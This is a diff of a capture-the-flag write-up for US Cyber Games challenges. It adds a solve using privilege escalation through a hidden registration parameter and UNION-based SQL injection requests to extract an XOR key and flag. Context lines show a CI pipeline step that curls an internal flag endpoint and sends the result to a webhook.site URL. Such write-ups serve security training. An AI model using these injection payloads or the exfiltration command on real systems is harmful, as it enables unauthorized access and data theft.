@@ -35,7 +35,7 @@ https://ctfd.uscybergames.com/files/6f9d8cad46a69ec3408cc68560d9cf64/certified.p
 ### Task
 ```
 Unravel
-331pts
+100pts
 This challenge has several parts. You are given a PCAP which shows how to attack the service provided below. Reverse the attack to gather and decrypt an unravel{} flag, then provide that to the API (/api/submit_flag) to gain the SIVUSCG{} flag to submit here.
 
 Additional details are provided on the index page of the challenge.
@@ -46,9 +46,70 @@ https://uscybercombine-s4-unravel.chals.io/
 ```
 
 ### My Solve 
+- open pcap file. follow stream, export objects
+- found their registering with: `username=exploit&password=c26ab7f72db3018d&secret_param=admin_secret` at `POST /register HTTP/1.1`
+- intercept register and add `&secret_param=admin_secret`
 
 
-- burp : https://uscybercombine-s4-unravel.chals.io/ 
+- encrypted flag that changes every two minutes is at: 
+
+```
+GET /admin/products?search=widget%27%20UNION%20SELECT%20NULL,key,NULL,NULL%20FROM%20xor_encryption_key-- HTTP/1.1
+
+Host: uscybercombine-s4-unravel.chals.io
+Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGV5MiJ9.ZmY5fw.3TS72PRORL08FNwihoz-z4N9ZDs
+Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://uscybercombine-s4-unravel.chals.io/admin/products
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Connection: keep-alive
+
+```
+
+
+- now that you're logged 
+
+- use repeater on these endpoints. For the XOR'd `unravel{flag_fake}` and the key `856abadb45ad7751` 
+
+`GET /admin/products?search=widget%27%20UNION%20SELECT%20NULL,xor_encrypted_flag,NULL,NULL%20FROM%20xord_flag-- HTTP/1.1`
+`GET /admin/products?search=widget%27%20UNION%20SELECT%20NULL,key,NULL,NULL%20FROM%20xor_encryption_key-- HTTP/1.1` 
+
+
+- note the key doesn't change. So get the flag and decrypt it and submit within 2minutes to `POST /api/submit_flag HTTP/1.1` 
+
+```json
+{
+"decrypted_flag": "unravel{flag_cfaa467692feec64}"
+}
+
+```
+
+
+and BINGO... 
+
+
+```json
+HTTP/1.1 200 OK
+
+Server: Werkzeug/3.0.3 Python/3.9.19
+Date: Sun, 09 Jun 2024 23:54:02 GMT
+Content-Type: application/json
+Content-Length: 81
+Connection: close
+
+{"message":"Congratulations! The flag is: SIVUSCG{r3vers3_att@cks_c@sh_ch3cks}"}
+```
+
 
 
 
@@ -296,7 +357,7 @@ async def trusted_ip_middleware(request: Request, call_next):
   - adding: `run: curl https://webhook.site/0baeaa9f-a9d6-467c-81fb-648c3e08d010/$(curl http://10.0.0.9:8000/get_flag)` since the gitea site `http://git.hackmeto.win/` is technically on the same network, another fork can curl from it and pass the python middleware network check. 
 
 
-```
+```yaml
 name: Gitea Actions Demo
 run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀
 on: [push]
@@ -322,7 +383,7 @@ jobs:
 
 - checking the status of his gitea actions log... we see the flag
 
-  ```
+```
   curl https://webhook.site/0baeaa9f-a9d6-467c-81fb-648c3e08d010/$(curl http://10.0.0.9:8000/get_flag)
 0s
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -331,4 +392,18 @@ jobs:
 100    40  100    40    0     0   8169      0 --:--:-- --:--:-- --:--:-- 10000
 curl: (3) nested brace in URL position 75:
 https://webhook.site/0baeaa9f-a9d6-467c-81fb-648c3e08d010/{"flag":"SIVUSCG{thr0ugh_th3_p1p3l1n3}"}
-  ```
+```
+
+
+
+## Sign... Compress... Encrypt??? [Crypto]
+
+### Task
+408
+I can never remember what order I'm supposed to do these in... I think I got it right this time!
+
+Author: BenderBot
+
+https://uscybercombine-s4-crypto-sign-compress-encrypt.chals.io
+
+### 
